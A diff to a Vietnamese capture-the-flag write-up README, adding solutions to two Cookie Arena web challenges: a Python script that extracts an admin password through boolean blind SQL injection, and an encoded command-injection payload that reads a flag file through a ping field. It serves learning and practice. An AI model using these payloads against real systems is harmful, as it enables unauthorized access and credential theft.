@@ -31,6 +31,8 @@
 - [Youtube Downloader](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#youtube-downloader)
 - [Ping 0x01](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#ping-0x01)
 - [The Existed File](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#the-existed-file)
+- [Simple Blind SQL Injection]()
+- [Ethical Ping Pong Club]()
 ### HTTP Request Content-Length
 Challenge:
 
@@ -862,6 +864,53 @@ Sau khi gửi request, tôi thu được flag:
 ![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image155.png?raw=true)
 
 ![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image156.png?raw=true)
+### Simple Blind SQL Injection
+
+![img](157)
+
+Trang web sẽ có trường để nhập `uid` để kiểm tra xem user có uid này tồn tại không, đồng thời mỗi khi nhập `uid` thì tham số `?uid=` sẽ được thêm vào URL và trang web cũng trả về cú pháp truy vấn SQL, do đó tôi đã thử thêm payload để tìm ra độ dài mật khẩu:
+
+![img](158)
+
+Như vậy tôi đã tìm ra độ dài mật khẩu là 13. Tiếp theo tôi đã viết một script python để brute-force từng ký tự của mật khẩu:
+
+    import requests
+    import string
+
+    url = "http://103.97.125.56:32709/"
+    charset = string.ascii_lowercase + string.digits + "_"
+    password = ""
+
+    for i in range(1, 14): 
+        for ch in charset:
+            payload = f"admin' AND SUBSTRING((SELECT upw FROM users WHERE uid='admin'),{i},1)='{ch}'-- -"
+            r = requests.get(url, params={"uid": payload})
+
+            if "exists" in r.text: 
+                password += ch
+                print(f"[+] Found so far: {password}")
+                break
+
+    print(f"[*] Final password: {password}")
+
+Cuối cùng mật khẩu tìm được là:
+
+![img](159)
+
+Đăng nhập và tìm được flag:
+
+![img](160)
+### Ethical Ping Pong Club
+
+![img](161)
+
+Trang web:
+
+![img](162)
+
+Là 1 thử thách command injection, tôi sử dụng payload `127.0.0.1%0acat%09/fla?.txt` và tìm được flag:
+
+![img](163)
 
 
 
